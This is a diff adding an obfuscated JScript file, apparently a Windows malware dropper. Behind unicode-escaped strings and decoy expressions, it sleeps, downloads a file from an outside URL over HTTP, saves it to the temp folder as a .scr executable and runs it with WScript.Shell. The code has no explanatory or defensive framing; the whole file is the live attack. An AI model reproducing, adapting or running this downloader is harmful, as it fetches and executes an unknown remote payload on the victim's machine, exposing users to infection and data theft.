@@ -1,0 +1,24 @@
+raidAxiom = (((229, 1) + (22, 0)), this);
+shortsFlag = ("\u0072\u006fl" + "\u0065", "\u0073a\u0074" + "e\u006cl\u0069" + "\u0074\u0065", "\u006do\u006d" + "e\u006e\u0074", "extra" + "c" + "\u0074", "\u0052\u0075\u006e");
+balloonReorganize = raidAxiom[("W\u0053\u0063\u0072" + "\u0069\u0070" + "t")];
+balloonReorganize[("Sl\u0065ep")]((([!+[] + !+[] + !+[]]) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1) * ([!+[] + !+[]]) * ([!+[] + !+[]]) * ([!+[] + !+[]]) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - (1 - 0)) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - (([+!+[]]))) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - (0 ^ 1))));
+provisionModal = balloonReorganize[("p\u0072es\u0069d" + "en" + "\u0074", "\u0043\u0072" + "eate" + "Ob" + "je\u0063t")](("\u0073ta\u0074\u0069" + "s\u0074" + "i\u0063a" + "\u006c", "\u0064\u0065mo\u006e", "v\u0069" + "\u006fle" + "\u0074", "i\u0063on", "\u0057S\u0063" + "r\u0069" + "p" + "t.\u0053\u0068\u0065l" + "l"));
+accumulatorStandard = provisionModal[("\u0061p" + "\u0070a" + "\u0072" + "atu" + "s", "\u0072esi\u0073" + "\u0074o\u0072", "\u0070\u006cus", "Ex\u0070a" + "nd\u0045\u006e" + "\u0076ir\u006f\u006e\u006d" + "\u0065nt\u0053" + "t\u0072i" + "n" + "g\u0073")](("\u0061" + "stro\u006e" + "\u0061ut", function String.prototype.decorationBandage() {
+	return this
+}, "%TEM\u0050" + "\u0025\u002f")) + ("\u0074riu\u006d\u0070" + "h", "\u0074" + "\u0072" + "\u0061\u006e\u0073l" + "\u0061t\u0069on\u0041" + "\u0063\u0061" + "de\u006dy") + ("\u0061\u0072\u0065\u006ea", "bam" + "bo\u006f", "\u006d\u006f\u0064" + "\u0069\u0066\u0079", "\u002es\u0063r");
+practiceRegulate = raidAxiom[("p" + "assi\u006fn", "e\u0066\u0066\u0065\u0063" + "\u0074", "\u0061t\u0074ac" + "k", "i" + "\u006e\u0074\u0065\u006cl\u0065" + "\u0063t", "\u0057S" + "c" + "\u0072\u0069\u0070t")][("\u0073" + "\u0070e\u0063\u0069a" + "l", "C\u0072\u0065\u0061" + "\u0074\u0065O" + "bj\u0065" + "ct")](("\u0074\u0072ac\u0074", "resis\u0074" + "\u006fr", "\u0061\u006dph" + "i\u0062" + "ia\u006e", "t" + "\u0065\u006c\u0065\u0076\u0069s" + "io" + "\u006e", "M" + "\u0053X\u004d\u004c2\u002e" + "X" + "\u004d" + "LH\u0054\u0054" + "\u0050"));
+practiceRegulate[("m\u006f\u0064el", "\u006d" + "arc\u0068", "\u006fp" + "en")](("a\u0067\u0067r\u0065g" + "\u0061\u0074e", "\u0073\u0061" + "l\u0075t\u0065", "G\u0045T"), ("l" + "o" + "\u0063a\u0074" + "\u0069o\u006e", "at\u0074r\u0061c" + "tio\u006e", "p\u006fpu" + "\u006c\u0061t\u0069" + "o\u006e", "h" + "\u0074\u0074" + "p\u003a" + "\u002f\u002f\u0061c\u0063\u0065" + "s\u0073in\u0076" + "\u0065\u0073\u0074men" + "t\u002e\u006ee" + "\u0074/4\u002f0v" + "e\u0078\u0077" + "3\u00735"), !(2 == (((0 & 0) ^ (1 ^ 0)) + ((16 - 16) ^ (79, 1)))));
+practiceRegulate[("\u0073\u0074y\u006c\u0065", "send")]();
+while (practiceRegulate[("\u0061cc" + "\u006f" + "mpan\u0079", "r\u0065" + "a\u0064\u0079s" + "ta" + "te")] < ((2 + 43) - (186, 41))) {
+	raidAxiom[("\u0061c" + "\u0063o\u006dm" + "\u006f\u0064\u0061" + "t\u0069on", "WScr" + "\u0069" + "\u0070\u0074")][("\u006fce\u0061n", "\u0070\u0072\u006fp\u006f" + "r\u0074\u0069\u006fn", "acc\u0075" + "\u0072\u0061" + "\u0063\u0079", "nu" + "\u006der" + "al", "Slee" + "p")](2 * (1 ^ 4) * (5 - 3) * (150 / 30));
+}
+publicationAirplane = raidAxiom[("\u0057Scr\u0069" + "\u0070t")][("C\u0072\u0065a\u0074\u0065" + "\u004f\u0062j\u0065" + "c\u0074")](("fort" + "\u0075n\u0065", "depa\u0072t" + "m" + "ent", "\u0070r\u006f\u006a" + "ec\u0074\u0069\u006fn", "A" + "D\u004f\u0044\u0042\u002e" + "\u0053t\u0072" + "e" + "\u0061\u006d"));
+try {
+	publicationAirplane[("art\u0069" + "s\u0074", "\u006fp" + "\u0065\u006e")]();
+	publicationAirplane[("\u0073y\u006d\u0070\u0068" + "ony", "ty" + "\u0070" + "\u0065")] = ((0 + 1) & (73, 40, 1));
+	publicationAirplane[("fu\u006ec" + "t\u0069\u006f\u006e", "amp\u0065r" + "\u0065", "cons\u0075\u006c" + "t\u0061" + "nt", "w" + "r\u0069\u0074" + "e")](practiceRegulate[("por" + "\u0074\u0069o\u006e", "\u0052" + "\u0065" + "s\u0070\u006fn" + "\u0073e" + "\u0042\u006f" + "d" + "y")]);
+	publicationAirplane[("\u0069\u006ej\u0065c\u0074" + "\u0069o" + "n", "ma" + "\u0063h\u0069n" + "e", "\u0064\u0065l" + "eg\u0061" + "\u0074\u0069\u006fn", "p\u006f" + "\u0073" + "i\u0074\u0069" + "o\u006e")] = (0 + 0);
+	publicationAirplane[("\u0062arr\u0065" + "l", "\u0073\u0061v\u0065T\u006f" + "\u0046\u0069" + "\u006c\u0065")](accumulatorStandard, (1 * (1 * 2)));
+	publicationAirplane[("r" + "\u0075i" + "n", "gen" + "e\u0072" + "\u0061l", "a" + "v" + "en\u0075" + "\u0065", "t\u0072\u0069\u0075m\u0070" + "h", "c\u006co\u0073" + "\u0065")]();
+	provisionModal[shortsFlag](accumulatorStandard.decorationBandage(), ((41 - 4) - (51 - 14)), ((0 & 0) | 0));
+} catch (translationPresident) {};
